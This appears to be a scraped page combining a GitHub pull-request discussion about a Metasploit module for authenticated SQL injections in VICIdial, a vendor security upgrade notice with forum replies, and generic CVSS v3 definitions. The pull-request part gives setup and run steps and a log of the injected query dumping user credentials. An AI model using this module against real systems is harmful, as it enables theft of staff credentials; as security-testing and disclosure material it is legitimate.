This PR adds a module which exploits several authenticated sqli in VICIdial. Of note, two of the modules require a permissions change (vicibox sets admin permissions to near nothing, other than the ability to change permissions).

## Verification

* install vicibox (which includes vicidial and OS) per markdown instructions
* Start `msfconsole`
* `use auxiliary/scanner/http/vicidial_multiple_sqli`
* `set rhosts and password`
* `run`
* **Verify** you get cleartext creds
* **Document** looks good

This makes testing much easier. Also, it would be worth testing the module on VICIbox and GOautodial anyway, as this is probably one of the most common methods of VICIdial deployment [citation needed]. |

| Hey [@h00die](https://github.com/h00die), thanks for the contribution. Just wondering if you have any update on this? No worries if not. I might spin up one of the ISOs bcoles mentioned and give it a test if you think it's almost ready. |

No worries at all [@h00die](https://github.com/h00die), just checking in. I gave it a test and put together some documentation. I tried pushing up the changes to a PR on your fork but got a permissions denied error - I was likely doing something incorrectly my apologies, so it's just included below.

Durning testing 2 of the 5 actions were failing while testing against ViciBox\_v9. I'll investigate a bit further today:

```
List Users - access_recordings method      working
List Users - agent_time_sheet method       Testing of SQLi failed.
List Users - agentcall_email method        working
List Users - modify_email_accounts method  working
List Users - user_stats method             Testing of SQLi failed.

```

This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to

svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable)

## Vulnerable Application

1. Install the following OpenSUSE 10 ISO [ViciBox\_v9.x86\_64-9.0.3.iso](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9.x86_64-9.0.3.iso):
   1. Change the default password
   2. Set Timezone, Keyboard Layout and Language
   3. Network settings should autoconfigure (Tested on VMware Fusion). Network settings can be configured with the

      command `yast lan` if necessary
2. Run `vicibox-express` to initiate the ViciDial Express Installation, everything can be kept as default
3. Navigate to `http://<ip-address>/`
   1. Click `Administration` and login with default credentials username: `6666`, password: `1234`
   2. Once logged in, Click "Finish setup". Everything can be kept as default.
4. The complete list of setup instructions can be found by following this [link](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9-install.pdf)

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/vicidial_multiple_sqli`
3. Do: `set username <username>`
4. Do: `set password <password>`
5. Do `show actions`
   1. Select from the list or keep the default
6. Do: `run`
7. The module will exploit the selected SQL injection and return the extracted usernames and passwords

## Scenarios

ViciBox\_v9.x86\_64-9.0.3 using the List Users - modify\_email\_accounts method:

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - modify_email_accounts method
action => List Users - modify_email_accounts method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(TXMlUAF) from (select cast(concat_ws(';',ifnull(user,''),ifnull(pass,'')) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Encoded to (select group_concat(TXMlUAF) from (select cast(concat_ws(0x3b,ifnull(user,repeat(0x87,0)),ifnull(pass,repeat(0x52,0))) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Time-based injection: expecting output of length 46

[+] Dumped table contents:

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Thanks for mentioning this bcoles. [@h00die](https://github.com/h00die) for transparency I installed and setup GOautodial and the module as it's written is unable to authenticate with the application. The login URI's and authentication requirements are a bit different.  Edit: Not sure if you'll want to investigate this further. If you do, when installing GOautodial this [link](https://goautodial.org/attachments/17338) is useful. If not, outlining what this module has been tested on and what it is intended to work on might be sufficient. |

| not surprising about GOautodial using a different url structure. My schedule is freeing up, hoping to restart this and get it finished soon.  I used ViciBox\_v10.x86\_64-10.0.0.iso, not 9, so that may account for some of the modules not working as new features may have been added. When I work on the doc, i'll do 9 and 10 at the same time. |

### [Recommended VICIdial Security Upgrade Notice: April 2022](#p149299)

Please read this carefully as it contains important information regarding the security of your VICIdial system.

Due to the recent discovery of several new security risks in the admin and agent web interface code, we have rolled out an update to the VICIdial code-base. These vulnerabilities have been patched and we have added additional code that further secures the web-facing portions of VICIdial. Any system that is at SVN revision 3583 or greater already has these changes(March 7, 2022). If your system is below that version, we strongly recommend that you upgrade VICIdial to address these concerns.

Instructions for how to connect to our public SVN server to get the latest code are available here:
<http://wiki.vicidial.org/doku.php?id=svn>

You can also find recent snapshots of the svn code available here:
<https://www.vicidial.org/svn_trunk_nightly/>

If you have a VICIhost account with us, know that we have already upgraded all servers and there is nothing that needs to be done on your end.

This Upgrade Notice covers several separate CVEs that have been submitted by several different people and organizations over the last few months, and those CVEs will be published in the near future by the people and organizations that reported them. All of these vulnerabilities involve PHP specifically, most of them require authenticated user access to your VICIdial system to exploit. Most of these exploits involved incomplete PHP input variable filtering. As a result of these reports, we spent several weeks reviewing every PHP script in the VICIdial codebase for input variables and filtering. We also made some security changes to make the system more secure by default.

If you have any questions about this notice, please contact us or reply to this post.

Hi Matt, does the most recent Vicibox iso at <http://www.vicibox.com/server/index.html> contain the most recent SVN?

When you install VICIbox, it will download the latest svn/trunk code, so YES, it will have this.

Thanks for information.
I suggest when we can do vicibox-install command, we can use --legacy option to enable legacy mode,
and this option will give latest version of svn which is available or we can choose specific version if we want to install.
So, it will be easier to find latest version of svn via this option to install vicibox on server.

Hope this helps!

The latest SVN is installed by ViciBox 10 or now 11 automatically, you can install a specific version you want by using the following commands:
cd /usr/src/astguiclient/trunk
svn up -r 3550 (or whatever revision you want)
But then you'll have the problem of matching the db schema. Refer to this guide for help - [https://dialer.one/index.php/useful-com ... l-servers/](https://dialer.one/index.php/useful-commands-to-manage-everyday-tasks-on-asterisk-vicidial-servers/)

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
